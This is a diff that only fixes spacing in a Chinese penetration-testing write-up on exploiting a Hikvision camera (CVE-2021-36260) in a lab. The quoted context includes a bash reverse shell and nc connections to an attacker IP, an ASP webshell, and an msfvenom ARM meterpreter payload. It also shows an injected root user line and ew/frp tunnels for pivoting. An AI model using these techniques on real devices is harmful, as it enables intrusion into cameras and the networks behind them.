@@ -32,14 +32,14 @@ tags:
 -   4\. SSH
     
 
--   0x03 突破受限的shell
+-   0x03 突破受限的 shell
     
 
 -   1\. SSH 传输文件
     
 -   2\. SFTP/SCP/FTP
     
--   3\. Bash 反弹shell
+-   3\. Bash 反弹 shell
     
 -   4\. 通过 Web 后台尝试上传
     
@@ -167,7 +167,7 @@ Content-Length: 71
 
 ![图片](assets/1710993392-8167b6716e32bbfad4e4d87455175b04.png)
 
-URL编码后
+URL 编码后
 
 ![图片](assets/1710993392-49266f3ec18bf4ef174c4c227d2cad29.png)
 
@@ -203,13 +203,13 @@ Railgun 工具中正好集成了这个漏洞，直接用工具执行，免得每
 
 还是没有访问
 
-难道没有这两个命令吗？ 使用 `which` 和 `whereis` 查找一下，先拿 `pwd` 程序测试一下
+难道没有这两个命令吗？使用 `which` 和 `whereis` 查找一下，先拿 `pwd` 程序测试一下
 
 ![图片](assets/1710993392-74098d59836aa28052febf6cb82488ad.png)
 
 ![图片](assets/1710993392-d446d16a50c350032820709b1b5a3295.png)
 
-命令执行并没有结果返回，这里有很多可能，例如系统中的 `pwd` 仅是 shell 内置命令，没有外部文件，这个可以参考之前的文章 《LD\_PRELOAD 劫持 PWD 为什么失败了 | Linux 后门系列》
+命令执行并没有结果返回，这里有很多可能，例如系统中的 `pwd` 仅是 shell 内置命令，没有外部文件，这个可以参考之前的文章《LD\_PRELOAD 劫持 PWD 为什么失败了 | Linux 后门系列》
 
 > https://mp.weixin.qq.com/s/InMQaKOwns2mEIp5yF8dDw
 
@@ -262,7 +262,7 @@ bash -i >& /dev/tcp/192.168.1.125/4444 0>&1
 
 ![图片](assets/1710993392-d71d159ad9f9de955fbd1157e6b0ae58.png)
 
-难道是不出网？ 测试一下 `ping`
+难道是不出网？测试一下 `ping`
 
 ```plain
 ping -t 1 192.168.1.125
@@ -292,7 +292,7 @@ nc -nv 192.168.1.125 4444
 
 可以看到这是个动态链接的 ELF 文件，还是 ARM 架构的，还去除了符号信息
 
-可以通过命令枚举或者ELF逆向分析查看这其中会不会有可以远程下载或者远程控制的方法，但这个 `da_info` 可能仅是海康的设备上的，不是通用的方法，我们不对这个进行深入研究，仅仅是通过执行该程序看看 `banner`
+可以通过命令枚举或者 ELF 逆向分析查看这其中会不会有可以远程下载或者远程控制的方法，但这个 `da_info` 可能仅是海康的设备上的，不是通用的方法，我们不对这个进行深入研究，仅仅是通过执行该程序看看 `banner`
 
 ![图片](assets/1710993392-22a37c419fa593069a9e6bce2600adeb.png)
 
@@ -306,7 +306,7 @@ nc -nv 192.168.1.125 4444
 
 ![图片](assets/1710993392-ade3b07d42cb6064e28062b0159f8970.png)
 
-这本身是个 web 系统啊，还是 `asp` 的，啊？ Linux 上的 `asp` 还真是少见，我直接写一个 `asp` 的木马进去不就完了吗？
+这本身是个 web 系统啊，还是 `asp` 的，啊？Linux 上的 `asp` 还真是少见，我直接写一个 `asp` 的木马进去不就完了吗？
 
 先找到 web 路径，从漏洞利用 PoC 可以知道，`./webLib` 对应的应该就是根目录
 
@@ -325,7 +325,7 @@ nc -nv 192.168.1.125 4444
 ```plain
 <%
 Response.CharSet = "UTF-8" 
-k="e45e329feb5d925b" '该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+k="e45e329feb5d925b" '该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
 Session("k")=k
 size=Request.TotalBytes
 content=Request.BinaryRead(size)
@@ -356,7 +356,7 @@ execute(result)
 
 不出所料，连接不上
 
-为什么会不解析呢？ 看一下其他的 `asp` 文件，难道有什么特殊的吗
+为什么会不解析呢？看一下其他的 `asp` 文件，难道有什么特殊的吗
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
@@ -380,7 +380,7 @@ ls -al /proc/331/exe
 
 ![图片](assets/1710993392-eb1c090b62ddbb7d5c1399543e624313.png)
 
-就在当前目录下，但是被删除了，根据 《Linux 应急响应手册》小技巧 -> 0x08 数据恢复，尝试恢复该程序
+就在当前目录下，但是被删除了，根据《Linux 应急响应手册》小技巧 -> 0x08 数据恢复，尝试恢复该程序
 
 ![图片](assets/1710993392-493df83b6994ad01719978ee33c5eafb.png)
 
@@ -393,7 +393,7 @@ ls -al /proc/331/exe
 发文件的过程中发现以下文件
 
 ```plain
-/home/davinci.lzma    // 压缩后的程序， lzma -d davinci.lzma 可以解压
+/home/davinci.lzma    // 压缩后的程序，lzma -d davinci.lzma 可以解压
 /dav/davinci_bak
 ```
 
@@ -401,7 +401,7 @@ ls -al /proc/331/exe
 
 ### 4\. SSH
 
-上面首先是尝试了反向控制相关的远程下载、反弹shell，也尝试了正向控制中的 Webshell，都没有成功，由于是测试环境，我是知道它是出网的，所以没有测试出网情况。
+上面首先是尝试了反向控制相关的远程下载、反弹 shell，也尝试了正向控制中的 Webshell，都没有成功，由于是测试环境，我是知道它是出网的，所以没有测试出网情况。
 
 没有 `nc`、`telnet` 之类的工具，就只能使用现有的服务来监听端口了，`ssh` 服务是一个不错的选择，这也是 `PoC` 中利用的方式
 
@@ -476,7 +476,7 @@ dropbear -R -B -p 1337
 $1$yi$edpzE7hM/R4nw3PnFuiVL/
 ```
 
-admin 的hash含义是密码经过了 `md5` 加密并且盐(salt) 值为 `yi`
+admin 的 hash 含义是密码经过了 `md5` 加密并且盐 (salt) 值为 `yi`
 
 在我们自己的 Ubuntu 上安装 `whois` ，并通过 `mkpasswd` 生成 `Hash`
 
@@ -503,7 +503,7 @@ user:$1$12345678$sEgioVKWacw6d9iYXc1P4/:0:0:W:/:/bin/sh
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-这 ssh 还设置了一些安全策略，错误的密码登录后（例如通过 FinalShell 登录尝试），会导致IP封禁
+这 ssh 还设置了一些安全策略，错误的密码登录后（例如通过 FinalShell 登录尝试），会导致 IP 封禁
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
@@ -513,7 +513,7 @@ user:$1$12345678$sEgioVKWacw6d9iYXc1P4/:0:0:W:/:/bin/sh
 
 至此，已经成功获取了 ssh shell，上面的部分内容都是铺垫，接下来就是今天要详细探讨的内容
 
-## 0x03 突破受限的shell
+## 0x03 突破受限的 shell
 
 目前虽然获取到了 SSH 的权限，但是无法上传文件，建立代理
 
@@ -561,13 +561,13 @@ sftp -P 1337 user@192.168.1.64
 
 并没有 21 等端口开放
 
-### 3\. Bash 反弹shell
+### 3\. Bash 反弹 shell
 
 之前失败了，由于之前显示不全，不知道失败的原因，现在可以重新试试
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-看来 busybox 把这个功能去掉了，包括UDP
+看来 busybox 把这个功能去掉了，包括 UDP
 
 ### 4\. 通过 Web 后台尝试上传
 
@@ -591,7 +591,7 @@ CVE-2021-36260 的作者 `Watchful_IP` 在漏洞描述过程中介绍了可以�
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-这就很直观了，我们选择动态端口转发，按照提示填写本地代理监听端口以及作为中转的SSH服务器信息
+这就很直观了，我们选择动态端口转发，按照提示填写本地代理监听端口以及作为中转的 SSH 服务器信息
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
@@ -617,13 +617,13 @@ CVE-2021-36260 的作者 `Watchful_IP` 在漏洞描述过程中介绍了可以�
 
 代理成功，但是这还不是很明显，建立代理的这台 Windows 网段为 `192.168.31.x` ，我们在 192.168.1.x 段找一台服务器，禁止来自 192.168.31.x 以及路由 192.168.1.97 的连接，这样就可以测试代理是否成功
 
-模拟隔离主机: 192.168.1.126
+模拟隔离主机：192.168.1.126
 
 规则如下：
 
 -   允许 192.168.1.0/24 访问 80
     
--   禁止 192.168.1.97（路由器） 访问 80
+-   禁止 192.168.1.97（路由器）访问 80
     
 -   禁止 192.168.31.0/24 (攻击机) 访问 80
     
@@ -688,7 +688,7 @@ sudo ufw allow from 192.168.1.0/24 to any port 80
 -   \-e 启用转义字符的解析
     
 
-这两个选项有效地将 16进制表示的二进制可执行文件一点一点写入到文件中
+这两个选项有效地将 16 进制表示的二进制可执行文件一点一点写入到文件中
 
 所以这里涉及两个步骤
 
@@ -772,7 +772,7 @@ print('Over')
 
 #### 1) 生成 Payload 文件
 
-直接使用 `MSF`  进行生成，我们需要知道 CPU架构、32 还是 64 位处理器、大端还是小端
+直接使用 `MSF`  进行生成，我们需要知道 CPU 架构、32 还是 64 位处理器、大端还是小端
 
 类似 `arch`、`lscpu` 这些命令在当前环境中都没有，可以通过下面的命令进行查看
 
@@ -782,7 +782,7 @@ cat /proc/cpuinfo
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-可以看到 CPU 为 `ARM926EJ-S rev 5 (v5l)` ，经过查询是一款 ARM 架构，32 位的CPU
+可以看到 CPU 为 `ARM926EJ-S rev 5 (v5l)` ，经过查询是一款 ARM 架构，32 位的 CPU
 
 大小端这个事我们可以从服务器上下载几个可执行文件，看看它们是大端还是小端的
 
@@ -812,7 +812,7 @@ msfvenom -p linux/armle/meterpreter/reverse_tcp -a armle RHOST=192.168.1.12
 
 只有 344 个字节大小
 
-#### 2) 通过echo写入到服务器
+#### 2) 通过 echo 写入到服务器
 
 通过之前的部分我们可以知道，攻击数据包是有大小限制的，具体限制是多少还不是固定的，每种设备不一样
 
@@ -882,7 +882,7 @@ testPayloadLength(target)
 
 ![图片](assets/1710993392-7e70048e14a6af5699f6c97ee84afb89.png)
 
-如果你自己修改了脚本，建议这个数字再小一点，减少 4 的整数倍，这里就以 180 为例，修改echo写入脚本
+如果你自己修改了脚本，建议这个数字再小一点，减少 4 的整数倍，这里就以 180 为例，修改 echo 写入脚本
 
 ```plain
 import requests
@@ -967,7 +967,7 @@ print('Over')
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-成功反弹shell 并测试上传文件
+成功反弹 shell 并测试上传文件
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
@@ -979,7 +979,7 @@ print('Over')
 > 
 > https://github.com/fatedier/frp/releases/download/v0.55.1/frp\_0.55.1\_linux\_arm.tar.gz
 
-下载 `arm` 32位版本的
+下载 `arm` 32 位版本的
 
 在尝试通过 `meterpreter` 进行上传 frp 时，结果传到一半，`meterpreter` 就断了，之后就出现了
 
@@ -1001,7 +1001,7 @@ print('Over')
 -   下载器可以不是通用下载，只是从某个地址下载某个文件，可能体积更小
     
 
-选择哪个方法呢？ 在我看来 `meterpreter` 的方法更优，但是我们两个都实现一下，这一部分先实现 `meterpreter`
+选择哪个方法呢？在我看来 `meterpreter` 的方法更优，但是我们两个都实现一下，这一部分先实现 `meterpreter`
 
 再次利用脚本上传、建立监听、赋予权限并执行
 
@@ -1017,7 +1017,7 @@ print('Over')
 
 ![图片](assets/1710993392-99f2386a8fd9491cbccf109bc375a4ab.png)
 
-好吧，看来这个海康威视设备的性能确实不支持我们直接传递 11 M的程序
+好吧，看来这个海康威视设备的性能确实不支持我们直接传递 11 M 的程序
 
 上传 ew
 
@@ -1031,7 +1031,7 @@ ew 小多了，只有 195K
 
 > https://github.com/idlefire/ew
 
-攻击机VPS (192.168.1.125) 模拟公网IP
+攻击机 VPS (192.168.1.125) 模拟公网 IP
 
 ```plain
 ./ew -s rcsocks -l 1080 -e 8888
@@ -1043,7 +1043,7 @@ ew 小多了，只有 195K
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-受害摄像头(192.168.1.64)
+受害摄像头 (192.168.1.64)
 
 ```plain
 ./ew -s rssocks -d 192.168.1.125 -e 8888      
@@ -1077,7 +1077,7 @@ ew 小多了，只有 195K
 
 **我们更希望这部分内容是工程化的**，而且由于指令集的不同，各种木马程序和代理程序是否能够兼容也是一个巨大的问题
 
-这节我们要介绍一些恶意攻击者常用的思路，也就是先传输小的下载器进去，之后利用下载器下载真正的payload，当然了，其实写入 `meterpreter` 的本质也是一样的
+这节我们要介绍一些恶意攻击者常用的思路，也就是先传输小的下载器进去，之后利用下载器下载真正的 payload，当然了，其实写入 `meterpreter` 的本质也是一样的
 
 可能有小伙伴会说，这不难呀，有必要单独说吗？
 
@@ -1221,42 +1221,42 @@ int main(void) {
 
 这个时候发现 `ARM` 架构版本之类的挺复杂，gcc 分类方法就有以下几种
 
-Arm架构上的不同版本的GCC（GNU Compiler Collection）之间的主要区别体现在以下几个方面：
+Arm 架构上的不同版本的 GCC（GNU Compiler Collection）之间的主要区别体现在以下几个方面：
 
 1.  **目标架构支持**：
     
 
--   GCC的不同版本可能支持不同的Arm架构，比如ARMv5TE、ARMv7-A、ARMv8-A（AArch32/AArch64）等。每个版本可能在对特定架构特性的支持程度上有差异，例如浮点运算单元（FPU）、Thumb模式、NEON SIMD扩展等。
+-   GCC 的不同版本可能支持不同的 Arm 架构，比如 ARMv5TE、ARMv7-A、ARMv8-A（AArch32/AArch64）等。每个版本可能在对特定架构特性的支持程度上有差异，例如浮点运算单元（FPU）、Thumb 模式、NEON SIMD 扩展等。
     
 
-3.  **ABI兼容性**：
+3.  **ABI 兼容性**：
     
 
--   ABI（Application Binary Interface）决定了二进制文件如何与操作系统交互。不同的GCC版本可能遵循不同的ABI规范，如EABI（Embedded ABI）、Hard/Soft Float ABI等。这些规范会影响到函数调用约定、数据类型布局等。
+-   ABI（Application Binary Interface）决定了二进制文件如何与操作系统交互。不同的 GCC 版本可能遵循不同的 ABI 规范，如 EABI（Embedded ABI）、Hard/Soft Float ABI 等。这些规范会影响到函数调用约定、数据类型布局等。
     
 
-5.  **C++标准库支持**：
+5.  **C++ 标准库支持**：
     
 
--   不同版本的GCC支持的C++标准也会有所不同，比如C++98、C++11、C++14、C++17等。
+-   不同版本的 GCC 支持的 C++ 标准也会有所不同，比如 C++98、C++11、C++14、C++17 等。
     
 
-7.  **优化程度和bug修复**：
+7.  **优化程度和 bug 修复**：
     
 
--   新版本的GCC通常包含对编译器优化算法的改进和bug修复，这会影响编译出的程序性能和稳定性。
+-   新版本的 GCC 通常包含对编译器优化算法的改进和 bug 修复，这会影响编译出的程序性能和稳定性。
     
 
 9.  **工具链完整性**：
     
 
--   不同版本的GCC交叉编译工具链可能包含不同的组件集，如binutils（as、ld）、glibc/musl/uClibc等不同C库的适配。
+-   不同版本的 GCC 交叉编译工具链可能包含不同的组件集，如 binutils（as、ld）、glibc/musl/uClibc 等不同 C 库的适配。
     
 
 11.  **安全特性**：
     
 
--   新版本的GCC可能增加了对特定安全特性的支持，如stack protector、address sanitizer、undefined behavior sanitizer等。
+-   新版本的 GCC 可能增加了对特定安全特性的支持，如 stack protector、address sanitizer、undefined behavior sanitizer 等。
     
 
 我们的 CPU 信息
@@ -1316,7 +1316,7 @@ int main() {
 
 #### 2) 增加编译参数
 
-可能是编译过程中参数有问题，经过查询，发现可以设置 `ARM` 的架构以及CPU参数
+可能是编译过程中参数有问题，经过查询，发现可以设置 `ARM` 的架构以及 CPU 参数
 
 ```plain
 arm-linux-gnueabi-gcc -march=armv5tej -mtune=arm926ej-s hello.c
@@ -1747,7 +1747,7 @@ bindPort = 7000
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
-没有代理建立成功，通过ssh上去执行一下看看
+没有代理建立成功，通过 ssh 上去执行一下看看
 
 ![图片](assets/1710993392-37d80127b73f829661c0d17b431e0b18.svg)
 
@@ -1779,7 +1779,7 @@ git clone https://github.com/fatedier/frp.git
 
 ```plain
 export GOARCH=arm
-export GOARM=5  # 对应ARMv5架构
+export GOARM=5  # 对应 ARMv5 架构
 export CGO_ENABLED=1
 export CC=/home/join/download/buildroot-2024.02/output/host/bin/arm-linux-gcc
 export CXX=/home/join/download/buildroot-2024.02/output/host/bin/arm-linux-g++
@@ -1901,7 +1901,7 @@ route add 192.168.1.126 255.255.255.255 192.168.1.64
 
 -   命令行执行 `resetParam` 清空管理员的密码，默认用户 `admin`
     
--   将已知账号密码(例如`user/userpass`) 加密后的结果直接写入到用户密码所在的表
+-   将已知账号密码 (例如`user/userpass`) 加密后的结果直接写入到用户密码所在的表
     
 
 这两种情况看起来都能解决问题，但并不通用
